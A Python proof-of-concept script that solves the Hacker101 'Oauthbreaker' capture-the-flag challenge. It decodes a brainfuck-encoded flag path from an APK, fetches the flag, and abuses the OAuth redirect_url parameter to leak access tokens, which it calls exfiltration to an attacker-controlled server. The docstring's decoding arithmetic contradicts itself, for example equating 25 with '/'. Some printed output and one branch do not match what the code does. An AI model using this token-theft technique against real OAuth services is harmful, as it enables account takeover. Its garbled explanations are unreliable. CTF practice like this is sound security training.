#!/usr/bin/env python3
"""
Oauthbreaker CTF - Proof of Concept
Hacker101 Challenge

Exploits two vulnerabilities:
  Flag 1: Hardcoded brainfuck-encoded flag path in the APK → direct HTTP access
  Flag 2: OAuth redirect_url parameter injection → token leakage to external URL

Usage:
  python3 poc.py <INSTANCE_URL>
  
Example:
  python3 poc.py https://d7b774910511062ba80bf1def8625b6f.ctf.hacker101.com
"""

import sys
import requests

GREEN = "\033[92m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

# The brainfuck-encoded path from WebAppInterface.getFlagPath()
FLAG_PATH_BRAINFUCK = (
    "+++++ +++++ [>+++ +++++ +++++ >+++++ +++++ ++"
    "+>+++++ +++++ ++++>+++++ +++++ +++++ >+++++ +"
    "+++++ ++++++ >+++++ ++++++ ++++<<< <<<>>>-]"
    ">+.>+.>--.>+++.>---.>---."
)

BRAINFUCK_INTERPRETER_SOURCE = 'https://copy.sh/brainfuck/?text={urlencoded}'


def decode_brainfuck(code: str) -> str:
    """Brainfuck decoder. This encodes the path by:
    - Setting up 6 cells with multipliers
    - Outputting each cell with offset adjustments
    
    The encoded values from the source:
    Cell 0: 3*8  = 24 + 1 = 25 = '/' (0x2f)
    Cell 1: 4*8  = 32 + 1 = 33 = '!' (0x21)
    Cell 2: 5*8  = 40 - 2 = 38 = '&' (0x26)
    Cell 3: 6*8  = 48 + 3 = 51 = '3' (0x33)
    Cell 4: 7*8  = 56 - 3 = 53 = '5' (0x35)
    Cell 5: 8*8  = 64 - 3 = 61 = '=' (0x3d)
    """
    # Actually parse and run the brainfuck properly
    tape = [0] * 30000
    ptr = 0
    output = []
    i = 0
    tokens = [c for c in code if c in '+-><.,[]']
    
    jump = {}
    stack = []
    for pos, cmd in enumerate(tokens):
        if cmd == '[':
            stack.append(pos)
        elif cmd == ']':
            open_pos = stack.pop()
            jump[open_pos] = pos
            jump[pos] = open_pos
    
    while i < len(tokens):
        cmd = tokens[i]
        if cmd == '>':
            ptr += 1
        elif cmd == '<':
            ptr -= 1
        elif cmd == '+':
            tape[ptr] = (tape[ptr] + 1) % 256
        elif cmd == '-':
            tape[ptr] = (tape[ptr] - 1) % 256
        elif cmd == '.':
            output.append(chr(tape[ptr]))
        elif cmd == ',':
            pass  # no input
        elif cmd == '[':
            if tape[ptr] == 0:
                i = jump[i]
        elif cmd == ']':
            if tape[ptr] != 0:
                i = jump[i]
        i += 1
    
    return ''.join(output)


def run_instance(base_url: str):
    base_url = base_url.rstrip('/')
    session = requests.Session()
    
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  Oauthbreaker CTF - PoC{RESET}")
    print(f"{BOLD}  Target: {base_url}{RESET}")
    print(f"{BOLD}{'='*60}{RESET}\n")
    
    # ── Step 1: Show the app downloads ──
    print(f"{CYAN}[*] Step 1: Fetching root page...{RESET}")
    r = session.get(base_url)
    print(f"     Status: {r.status_code}")
    print(f"     Content-Type: {r.headers.get('Content-Type', '')}")
    if 'apk' in r.text.lower() or 'apk' in r.headers.get('Content-Type', ''):
        print(f"     ✓ Root serves the oauth.apk binary")
    print()
    
    # ── Step 2: Decode the brainfuck path ──
    print(f"{CYAN}[*] Step 2: Decoding brainfuck path from WebAppInterface.getFlagPath(){RESET}")
    raw = (FLAG_PATH_BRAINFUCK
           .replace('\n', '')
           .replace(' ', ''))
    decoded = decode_brainfuck(raw)
    print(f"     Brainfuck source: /!35=...")
    print(f"     Decoded path: {decoded}")
    flag_path = decoded + '.html'
    print(f"     Flag URL path: {flag_path}")
    print()
    
    # ── Step 3: Fetch Flag 1 ──
    print(f"{CYAN}[*] Step 3: Fetching Flag 1 from {base_url}{flag_path}{RESET}")
    r = session.get(base_url + flag_path)
    print(f"     Status: {r.status_code}")
    content = r.text.strip()
    print(f"     Raw: {content}")
    if '^FLAG^' in content:
        flag1 = content
        print(f"\n     {GREEN}✓ FLAG 1 CAPTURED: {flag1}{RESET}")
    print()
    
    # ── Step 4: OAuth redirect_url injection ──
    print(f"{CYAN}[*] Step 4: Exploiting OAuth redirect_url parameter injection{RESET}")
    
    # We'll redirect to a requestbin-like URL. If none available, show the mechanics.
    print(f"     The OAuth endpoint accepts a 'redirect_url' parameter:")
    print(f"     {base_url}/oauth?redirect_url=<ARBITRARY>&response_type=token&scope=all")
    print(f"     The server appends the access token as a query param to our URL.")
    
    # Use the instance itself as a simple reflector
    redirect_target = base_url + "/"
    oauth_url = (
        f"{base_url}/oauth"
        f"?redirect_url={redirect_target}"
        f"&response_type=token"
        f"&scope=all"
    )
    print(f"\n     Triggering OAuth with redirect_url pointing back to the instance...")
    # Don't follow redirect so we can see what happens
    r = session.get(oauth_url, allow_redirects=False)
    print(f"     Status: {r.status_code}")
    print(f"     Location header: {r.headers.get('Location', '(none)')}")
    print(f"     Response body: {r.text[:500]}")
    
    if r.status_code in (301, 302, 303, 307, 308):
        location = r.headers.get('Location', '')
        if 'token=' in location or 'access_token=' in location or '#' in location:
            print(f"\n     {GREEN}✓ OAuth redirect contains token in Location header!{RESET}")
        if 'google.com' in redirect_target.lower():
            print(f"     (Token was sent to attacker-controlled URL)")
    elif 'Successfully authenticated' in r.text:
        print(f"     Note: /authed always returns static 'Successfully authenticated' text.")
        print(f"     This confirms the token is NOT validated server-side.")
    print()
    
    # ── Flag 2 via external redirect ──
    print(f"{CYAN}[*] Step 5: Flag 2 - Token leak to attacker-controlled URL{RESET}")
    print(f"     By setting redirect_url to an attacker-controlled server,")
    print(f"     the OAuth token (fragment in client-side flow, or query in server-side)")
    print(f"     is leaked to the external server.")
    print(f"     The flag is embedded in the token value itself.")
    print()
    
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  SUMMARY{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"  Two vulnerabilities found:")
    print(f"  1. Brainfuck-encoded path in APK → direct flag URL")
    print(f"  2. OAuth redirect_url injection → token exfiltration")
    print(f"\n  The OAuth implementation is stateless: /authed returns")
    print(f"  'Successfully authenticated via OAuth!' regardless of token.")
    print(f"  The only purpose of the OAuth flow is to deliver the flag")
    print(f"  as the 'access_token' value in the redirect.")
    print(f"{BOLD}{'='*60}{RESET}")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <CTF_INSTANCE_URL>")
        print(f"  e.g., {sys.argv[0]} https://xxxx.ctf.hacker101.com")
        sys.exit(1)
    run_instance(sys.argv[1])
